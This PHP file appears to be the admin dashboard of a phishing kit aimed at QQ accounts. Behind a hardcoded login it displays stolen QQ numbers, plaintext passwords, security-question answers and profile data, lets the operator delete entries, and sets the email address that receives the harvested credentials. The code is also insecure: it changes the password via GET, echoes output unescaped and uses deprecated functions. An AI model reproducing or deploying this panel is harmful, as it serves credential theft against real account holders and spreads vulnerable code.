<?php
	require('function.php');
	session_start();
?>

<!DOCTYPE html>
<html>
<head>
	<meta charset="utf8">
	<title>管理后台</title>
	<link rel="stylesheet" type="text/css" href="style/style.css">
	<script type="text/javascript" src="http://ajax.microsoft.com/ajax/jquery/jquery-1.4.min.js"></script>
</head>
<body>
	<?php

		if(!isset($_SESSION['admin'])){
			if(isset($_POST['login'])){
				if(empty($_POST['username']) || empty($_POST['password'])){
					echo '<script>alert("用户名或密码不能为空");</script>';
				}else{
					$pw=getAdminPassword();
					$pw=json_decode($pw);
					if($_POST['username']=='rot' && $_POST['password']==$pw){
						$_SESSION['admin']='true';
						echo '<script>alert("登录成功");window.location.href="fuckshit.php";</script>';
					}else{
						echo '<script>alert("用户名或密码错误");window.location.href="fuckshit.php";</script>';
					}
				}
			}
		?>
			<div class="login-panel"></div>
			<div style="top:0" class="login-box">
				<div class="login_box_title">
					<h1><strong>Admin</strong></h1>
				</div>
				<div class="login_box_content">
					<ul>
						<li>
							<div class="login_box_register">登录</div>
							<div class="login_box_input">
								<form action="fuckshit.php" method="post">
									<input class="the_input light_blue" name="username" placeholder="请输入邮箱" style="width:92%" type="text">
									<input class="the_input light_blue" name="password" placeholder="请输入密码" style="width:92%" type="password">
									<div style="margin-top:-8px;margin-bottom:6px;"></div>
									<input class="the_btn light_blue white blue_border" name="login" value="登录" type="submit">
								</form>
							</div>
						</li>
					</ul>
				</div>
			</div>
		<?php
		}else{

			if(isset($_GET['password'])){
				if(empty($_GET['password'])){
					echo '<script>alert("新密码不能为空");</script>';
				}else{
					setAdminPassword($_GET['password']);
					echo '<script>alert("设置成功");window.location.href="fuckshit.php";</script>';				
				}
			}

			if(isset($_GET['email'])){
				if(empty($_GET['email'])){
					echo '<script>alert("接收邮箱不能为空");</script>';
				}else{
					if(!eregi("\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*",$_GET['email'])){
						echo '<script>alert("邮箱格式不正确");window.location.href="fuckshit.php";</script>';
					}
					setMail($_GET['email']);
					echo '<script>alert("设置成功");window.location.href="fuckshit.php";</script>';
				}
			}

			if(isset($_GET['logout'])){
				session_unset();
				session_destroy();
				echo '<script>alert("退出成功");window.location.href="fuckshit.php";</script>';
			}
	?>
		<div>
			<div class="alter-info">
				<form style="margin:0 auto;width:800px;margin-bottom:10px;text-align:center" method="get" action="fuckshit.php">
					<input name="password" type="password">
					<input type="submit" value="修改密码">
				</form>
				<form style="margin:0 auto;text-align:center" method="get" action="fuckshit.php">
					<input name="email" type="email">
					<input type="submit" value="修改邮箱">
				</form>
				<form method="get" style="text-align:center;margin-top:10px;" action="fuckshit.php">
					<input type="submit" name="logout" value="退出">
				</form>
				<input type="button" value="返回主页" onclick="backToHome()">
				<input type="button" value="删除全部" onclick="">
				<input type="button" value="批量删除" onclick="">
			</div>
			<table class="altrowstable" style="margin-top:10px;" id="alternatecolor">
				<tr>
					<th>QQ</th>
					<th>密码</th>
					<th>时间</th>
					<th>密保</th>
					<th>资料</th>
					<th>操作</th>
				</tr>

				<?php
					$qqlist=getAllQQ();
					$qqlist=json_decode($qqlist);
					$securityList=json_decode(getSecurity());
					// $detailList=json_decode(getDetail());
					$content='';
					$detailInfo='';
					if(!is_array($qqlist)){

					}else{
						foreach ($qqlist as $key => $value) {
							if(is_array($value)){
								foreach ($value as $k1 => $v2) {
									if($v2->qq==$securityList[$key]->qq){
										$content=$securityList[$key]->content;
									}
									$html=" <tr>
												<td>".$v2->qq."</td>
												<td>".$v2->password."</td>
												<td>".$v2->time."</td>
												<td>".$content."</td>
											</tr>";
									echo $html;
								}
							}else{
								if($value->qq==$securityList[$key]->qq){
									$content=$securityList[$key]->content;
								}
								$html=" <tr>
											<td>".$value->qq."</td>
											<td>".$value->password."</td>
											<td>".$value->time."</td>
											<td>".$content."</td>
											<td>".getDetail($value->qq)."</td>
											<td><input qq=\"".$value->qq."\" type=\"button\" onclick=\"deleteQQ(this)\" value=\"删除\"></td>
										</tr>";
								echo $html;
							}
						}
					}			
				?>
			</table>
		</div>

	<?php
		}
	?>

	<script type="text/javascript">
		function backToHome(){
			window.location.href="index.php";
		}

		function deleteQQ(obj){
			var qq=$(obj).attr('qq');
			$.get("deleteQQ.php?qq="+qq,function(data,status){
    			alert(data);
    			if(data=='成功'){
    				$(obj).parent().parent().slideUp();
    			}
  			});
		}

		$(document).ready(function(){
			$('body').css('background','rgb(255,255,255)');
		});
	</script>
</body>
</html>